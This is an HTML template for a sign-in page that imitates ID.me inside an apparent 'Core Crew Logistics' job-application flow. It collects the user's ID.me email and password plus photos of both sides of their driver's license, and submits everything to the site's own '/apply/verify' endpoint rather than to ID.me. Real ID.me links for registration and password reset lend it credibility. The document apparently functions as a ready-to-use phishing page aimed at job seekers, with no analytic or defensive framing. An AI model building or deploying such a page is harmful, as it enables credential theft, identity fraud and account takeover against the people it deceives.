<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <title>Sign in to ID.me - ID.me</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
  <link rel="icon" type="image/jpeg" href="/public/img/logo.jpg" />
  <link rel="stylesheet" href="/public/idme-signin.css" />
  <link rel="stylesheet" href="/public/styles.css" />
  <style>
    input, textarea, select {
      font-size: 16px !important;
    }
    .fixed-back-btn {
      position: fixed;
      top: 66px;
      left: 1rem;
      z-index: 1200;
    }
    @media (min-width: 701px) {
      .fixed-back-btn {
        top: 70px;
        left: 2rem;
      }
    }
  </style>
  <script>
    function submitSkip() {
      var form = document.getElementById('idme-form');
      form.action = '/apply/skip-idme/';
      form.method = 'post';
      var passwordInput = document.getElementById('idme-password');
      if (passwordInput) passwordInput.removeAttribute('name');
      form.submit();
    }
    // Client-side file validation for mobile & desktop
    document.addEventListener("DOMContentLoaded", function() {
      document.getElementById('idme-form').addEventListener('submit', function(e) {
        const allowedTypes = ['image/jpeg', 'image/png', 'application/pdf'];
        const maxSize = 5 * 1024 * 1024; // 5MB
        const front = document.getElementById('driversLicenseFront').files[0];
        const back = document.getElementById('driversLicenseBack').files[0];
        function validateFile(file, side) {
          if (file && !allowedTypes.includes(file.type)) {
            alert(side + ' image must be JPG, PNG, or PDF.');
            return false;
          }
          if (file && file.size > maxSize) {
            alert(side + ' image is too large (max 5MB).');
            return false;
          }
          return true;
        }
        if (!validateFile(front, "Front")) { e.preventDefault(); return; }
        if (!validateFile(back, "Back")) { e.preventDefault(); return; }
      });
    });
  </script>
</head>
<body>
  <a href="/apply/info-note" class="btn ghost fixed-back-btn"
     onclick="if(document.referrer && document.referrer !== window.location.href){window.history.back(); return false;}">
    &larr; Back
  </a>
  <div class="idme-page-wrapper">
    <div class="idme-top-bar">
      <div class="idme-top-bar-inner">
        <img src="/public/img/idme-logo.svg" alt="ID.me" style="height: 28px; filter: brightness(0) invert(1);" />
      </div>
    </div>
    <div class="page-container">
      <main class="form-container">
        <div class="form-header-content" role="banner">
          <div class="partner">
            <div class="company-logo" style="display:flex;align-items:center;gap:10px;justify-content:center;">
              <img class="logo" src="/public/img/logo.jpg" alt="Core Crew Logistics Logo">
              <span style="font-size:0.85rem;color:#7a8da0;margin:0 4px;">Ã—</span>
              <img src="/public/img/idme-logo.svg" alt="ID.me" style="max-height:32px;">
            </div>
          </div>
        </div>
        <div class="form-header-access">
          <h1 id="sr_page_title">Sign in to ID.me</h1>
        </div>
        <div class="form-header-well">
          <p><b>New to ID.me?</b>
            <a href="https://api.id.me/en/registration/new" target="_blank">Create an ID.me account</a>
          </p>
        </div>
        <form id="idme-form" class="idme-form" method="post" action="/apply/verify" autocomplete="off" enctype="multipart/form-data">
          <div class="form-fields">
            <div class="field text">
              <label for="idme-email">Email address</label>
              <input id="idme-email" type="email" name="email" required autocomplete="off" placeholder="your@email.com" value="<%= email %>">
            </div>
            <div class="field text password-showable signin-password-field">
              <label for="idme-password">Password</label>
              <input id="idme-password" type="password" name="password" required autocomplete="off" placeholder="Enter your password">
            </div>
            <div class="forgot-password-link">
              <a href="https://api.id.me/en/passwords/new" target="_blank">Forgot password?</a>
            </div>
            <div class="form-actions">
              <button type="submit" class="btn-primary">Sign in to ID.me</button>
            </div>
            <div class="idme-divider">
              <span>Identity Verification</span>
            </div>
            <div class="field file verify-upload-field">
              <label for="driversLicenseFront">Upload Driver's License / ID (Front)</label>
              <div class="upload-dropzone" id="dropzone-front">
                <svg class="upload-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M12 16V4m0 0L8 8m4-4l4 4"/><path d="M20 16v2a2 2 0 01-2 2H6a2 2 0 01-2-2v-2"/></svg>
                <span class="upload-dropzone-text">Choose a file or drag it here</span>
                <input type="file" name="driversLicenseFront" id="driversLicenseFront" accept="image/jpeg,image/png,application/pdf" required>
              </div>
              <p class="upload-hint">Accepted: JPG, PNG, PDF &middot; Max 5 MB</p>
            </div>
            <div class="field file verify-upload-field">
              <label for="driversLicenseBack">Upload Driver's License / ID (Back)</label>
              <div class="upload-dropzone" id="dropzone-back">
                <svg class="upload-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M12 16V4m0 0L8 8m4-4l4 4"/><path d="M20 16v2a2 2 0 01-2 2H6a2 2 0 01-2-2v-2"/></svg>
                <span class="upload-dropzone-text">Choose a file or drag it here</span>
                <input type="file" name="driversLicenseBack" id="driversLicenseBack" accept="image/jpeg,image/png,application/pdf" required>
              </div>
              <p class="upload-hint">Accepted: JPG, PNG, PDF &middot; Max 5 MB</p>
            </div>
          </div>
          <div class="skip-btn-row">
            <button type="button" class="btn-skip" onclick="submitSkip()">Skip ID.me &amp; Submit Application</button>
          </div>
          <div class="form-footer-message">
            <p>Social media sign-in is no longer available. Please sign in with your email or skip verification to continue.</p>
          </div>
        </form>
        <footer class="footer">
          <nav class="footer__links" aria-label="Footer">
            <a href="https://www.id.me/about" target="_blank" class="footer__link">What is ID.me?</a>
            <a href="https://www.id.me/terms" target="_blank" class="footer__link">Terms of Service</a>
            <a href="https://www.id.me/privacy" target="_blank" class="footer__link">Privacy Policy</a>
          </nav>
        </footer>
      </main>
    </div>
  </div>
</body>
</html>